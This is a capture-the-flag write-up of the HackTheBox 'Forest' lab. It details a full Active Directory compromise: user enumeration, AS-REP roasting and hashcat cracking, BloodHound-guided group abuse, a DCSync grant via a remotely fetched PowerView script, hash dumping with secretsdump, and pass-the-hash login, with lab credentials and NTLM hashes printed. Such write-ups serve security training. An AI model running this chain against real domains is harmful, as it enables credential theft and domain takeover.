---
layout: default
---


# Forest (AD DCSync)

# Skills

- Users enumeration (ldap or rpc)
- ASP-Roast attack
- DCSync Attack (Privilege Escalation)

# Enumeration

This first scanner with nmap reports a good number of ports opened

```bash
Host: 10.10.10.161 ()   Status: Up
Host: 10.10.10.161 ()   Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49671/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49684/open/tcp/////, 49706/open/tcp/////
```

A more in deep analysis with NMAP doesn’t report much more

```bash
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-09-17 06:57:44Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsof   syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-17T06:58:34
|_  start_date: 2023-09-17T06:52:30
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m29s, median: 6m49s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44879/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 44051/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-09-16T23:58:33-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## CRACKMAPEXEC

With this tools we are able to get a domain name → **HTB.local**

```bash
crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

## Discarded Services (DNS, SMB)

## DNS

The enumeration of the DNS server doesn’t provide very useful information. Neither we see new domains nor hidden records (MX, AAAA, A, SOA). Zone transfer attack doesn’t work either.

```bash
dig axfr htb.local @10.10.10.161

; <<>> DiG 9.18.16-1-Debian <<>> axfr htb.local @10.10.10.161
;; global options: +cmd
; Transfer failed.
```

## SMB

We are not able to connect to any SMB, guests session are allowed.

```bash
smbclient -L  \\\\10.10.10.161\\ 
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## LDAP

We will try to bind with the LDAP server and see if we can retrieve any information from there.

```bash
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local"
```

With the above command it seems like we can connect successfully with LDAP. Although there is a lot of useful information there, it is complicated analyse it easily, the reason being the fact that it is not easy to enumerate all the LDAP tree. without knowing the nodes.

We can use the tool called windapsearch to enumerate LDAP more easily.

```bash
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.161
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=htb,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 30 users:

cn: Sebastien Caron
userPrincipalName: sebastien@htb.local

cn: Lucinda Berger
userPrincipalName: lucinda@htb.local

cn: Andy Hislip
userPrincipalName: andy@htb.local

cn: Mark Brandt
userPrincipalName: mark@htb.local

cn: Santi Rodriguez
userPrincipalName: santi@htb.local

```

We will continue with the enumeration. 

## RDP

We are going to try a connection with the RDP service and see if we can get information from there.

```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[centesiman] rid:[0x2582]
user:[john] rid:[0x2583]
```

We can connect and we know have a list of domain users, with their RID. Actually, we can enuumerate also other thigs such as groups.

# Foothold

With a list of users we can know perform a ASP-Roast Attack. The vulnerability here is in the UF_DONT_REQUIRE_PREAUTH switch that disable the pre-auth in Kerberos, giving us the posibility to obtain a TGT from a user.

```bash
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -no-pass -usersfile domusers.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c3a6d1a4684e2ceea425de0982e36be2$70f4b4147292e0ba12be0ad377993dd65b82dc93c30bfd9ada3d5d112357d7f0d92953019f03afd3bf1472b3a38105bd9f082560432c53a3ca4ef5b81a1d749de397ea0f5345d830fc0d59c4bd379bc7eb8e00d8c3ed1b571aaa60d98c3de3764db588e0b0ba8c98dd180fbd7be01319f5a7f0f1ab1057a6c9d02bd1cb981d2bd885b50b75b157fc6b39b45bf5243b305c9ed61a2dea95ff5f0136ff218208556eccffdda0b0263bf076aaef2d45c46764521d5b00cd62089fa9fc5545e8a7e8aafe7673e9b5853ec138217b67df89562c68bf20f55a434c02b9962ae41a939bf738b5f219db
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

We can see a hash for the user **svc-alfresco** which can be cracked using Hashcat.

```bash
hashcat -m 18200 svc-alfresco_asproast.hash /usr/share/wordlists/rockyou.txt
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921515
* Keyspace..: 14344386

$krb5asrep$23$svc-alfresco@HTB.LOCAL:aed07bb35969f887301f309d9af57f04$98e9a1b121b215b94fe0c37be6e7229f4643ff5aba17093c2efa03a21d5a157977ed41589fd0081c2015eeef374458479210163ff80bef86b8e15dcffaad9f8dc7a1bfb5bf626da3a119517ede3110df286e00e9915015249d206dc2f1db6387b7d386b5c4bb9d4d9403305da2af1f6c103306534646e1437375eae1ac1c98336f21c14d1da7fb44fa604e11c5ff092622aa203cf51eb9cb3c0344418e692eeaf5ca0f2ee7524ce2221c30ed5ca62a04b3b05f05e2d98bdf2537a0ee68570b325be49aec1e03b10c0383599baa8866ec3e92cd92ebe370ea654ccd3a789a3c9c7adeaeac6415:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:aed07bb35969f8...ac6415
Time.Started.....: Sun Sep 17 17:07:07 2023 (4 secs)
Time.Estimated...: Sun Sep 17 17:07:11 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1013.3 kH/s (0.44ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344386 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4084736/14344386 (28.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s456838 -> s3r3nity1
Hardware.Mon.#1..: Util: 38%
```

Finally we can use crackmapexec to check if the credentials are valid.

```bash
crackmapexec winrm 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

We have know a foothold in the DC.

# Privilege escalation

To see our ways to escalate privilege we will use BloodHound to visualize all the different ways to do it.  First of all we will recover as much information as we can with **bloodhound-python**.

```bash
bloodhound-python -ns 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local -c all
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 22S
```

Then we will import this to BloodHound and look for ways to escalate privilege. If we check what groups we our owned user is Account Operators group.

![Untitled](/images/blood.png)

This groups hash a GenericAll Relationship with **Exchange Windows Permissions**, what means that we can add any user to thath group, in addition we can create new domain users, since we are part of Domain Operators. Members of **Exchange Windows Permission** can control the rights and add new permissions to users in the domain since they have the relationship **WriteDacl** with the whole domain.

- First we create a new user

```bash
net user centesiman cente234! /add /domain
The command completed successfully.
```

- Secondly we add this new user to **Exchange Windows Permission** group

```bash
net group 'Exchange Windows Permissions' centesiman /add
The command completed successfully.
```

In order to escalate privilege we have perform a DCSync Attack as Bloodhound suggests. This attack consists in giving a user DCSync rights, which will allow us to dump the SAM from the DC.

```bash
$SecPassword = ConvertTo-SecureString 'cente234!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\centesiman', $SecPassword)
```

In order to give this new user the DCSync right we need a tool from PowerView.

```bash
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerView.ps1')
```

Finally, we can give this new user the proper rights.

```bash
Add-ObjectAcl -Credential $Cred -PrincipalIdentity centesiman -Rights DCSync
```

This allow us to dump the SAM of the DC and get all the NTLM hashes, including the hash of the administrator user.

```bash
impacket-secretsdump htb.local/centesiman:'cente234!'@10.10.10.161 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
```

With the NTML hash of the administrator user we can login to the machine.

```bash
crackmapexec smb 10.10.10.161 -u "administrator" -H "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6"             
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```